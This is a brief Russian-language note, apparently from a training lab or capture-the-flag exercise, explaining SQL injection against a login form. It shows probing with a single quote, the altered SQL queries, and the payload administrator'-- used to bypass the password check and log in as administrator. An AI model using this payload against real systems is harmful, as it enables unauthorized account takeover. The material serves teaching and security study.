SQL injection

Цель: Войти в аккаунт администратора

Вставим ' в login, если страница сломается и вернет server error то он уязвим для SQLi


SELECT Firstname FROM users WHERE username = 'administrator' and password = 'administrator' 

SELECT Firstname FROM users WHERE username = ''' and password = 'administrator'

SELECT Firstname FROM users WHERE username = 'administrator'--' and password = 'administrator'

administrator'--     <--- Это наша полезная нагрузка